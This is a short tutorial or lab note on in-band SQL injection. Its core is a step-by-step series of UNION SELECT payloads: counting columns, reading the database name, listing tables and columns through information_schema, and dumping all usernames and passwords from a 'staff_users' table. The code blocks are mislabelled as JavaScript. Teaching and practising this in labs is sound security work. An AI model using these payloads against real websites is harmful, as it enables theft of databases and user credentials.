## In-Band SQL Injections

In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication 
being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability 
on a website page and then being able to extract data from the database to the same page.


This statement should produce an error message informing you that the UNION SELECT statement has a different 
number of columns than the original SELECT query. Add more columns if necessary
```JavaScript
1 UNION SELECT 1
```
```JavaScript
1 UNION SELECT 1,2
```
```JavaScript
1 UNION SELECT 1,2,3
```

Get the database name
```JavaScript
0 UNION SELECT 1,2,database()
```

Get all the tables in the database test
```JavaScript
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'test'
```

The information we want to retrieve has changed from table_name to column_name, the table we are querying in 
the information_schema database has changed from tables to columns, and we're searching for any rows where the 
table_name column has a value of staff_users.
```JavaScript
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

The results from the query above provide three columns for the staff_users table: id, password, and username. 
We can use the username and password columns for our following query to retrieve the user's information.

Use the group_concat method to return all of the rows into one string
```JavaScript
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```



